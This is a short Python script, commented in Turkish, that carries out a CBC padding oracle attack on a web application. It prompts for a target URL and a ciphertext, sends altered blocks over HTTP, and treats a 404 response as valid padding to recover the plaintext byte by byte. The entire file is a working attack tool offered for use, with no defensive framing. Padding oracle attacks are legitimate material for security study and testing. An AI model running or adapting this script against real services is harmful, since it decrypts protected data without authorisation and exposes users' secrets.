# coding: utf-8
import urllib.request as request
import urllib.error as error
import sys
from tqdm import tqdm
TARGET = input('Url giriniz:')
CIPHER = input('Sifrelenmis veriyi giriniz (Opsiyonel 128 karakter):')
#--------------------------------------------------------------
# Oracle Dolgu
#--------------------------------------------------------------
class PaddingOracle(object):
	def query(self, q):
		req = request.Request(TARGET + q) # Http isteği url ye gönderilir.
		try:
			f = request.urlopen(req) # Url'den cevap beklenir.
		except error.HTTPError as e:          
			#print("%d"% e.code)       # çözülmüş veriyi göster?
			if e.code == 404:
				return True # dolgulama iyi.
			return False # kötü dolgulama var.

	def requestAndDecrypt(self, IV, CYP): # IV ve CYPHER kullanarak One Block CBC şifre çözme mekanizması
		final = list() #Son byte listesi
		for byteNo in tqdm(range(1,17)):
			tempIV = list(IV)
			for t in range(byteNo - 1):
				tempIV[-(t+1)] ^= byteNo ^ final[t] 
			tempIV[-byteNo] ^= byteNo
			for g in range(128):
				G = 127 - g
				tempIV[-byteNo] ^= G ^ ( 0 if G == 127 else G+1 )
				reqCYP = bytes(tempIV).hex() + CYP.hex()
				if self.query(reqCYP) == True: # HTTP ile argümanları tetikleyelim.
					final.append(G) # liste sonuna byte ekleyelim.
					break
		final.reverse() # listeyi tersine çevir
		return bytes(final) # byte formatında dönüş listesi

	def decrypt(self, cypherText): # Veriyi HEX'den geri dönüştürelim.
		cypherTextBts = bytes.fromhex(cypherText) # Byte'a dönüştürelim.
		finalAns = bytes()
		for ix in range(1, len(cypherTextBts)//16): # Şifresini çözmek için tüm bloklar üzerinde döngü başlatır.
			print("\nBlock Sirasi : %d/%d"%(ix, len(cypherTextBts)//16 - 1))
			lastBlock = cypherTextBts[(ix - 1)*16 : ix * 16]
			currentBlock = cypherTextBts[ix * 16 : (ix + 1) * 16]
			finalAns = finalAns + self.requestAndDecrypt(lastBlock, currentBlock) # Son bloğu IV olarak ve geçerli bloğu veri olarak besleyelim
		return finalAns.decode('utf-8')

if __name__ == "__main__":
	po = PaddingOracle()
	msg = po.decrypt(CIPHER)
	print("\n" + msg)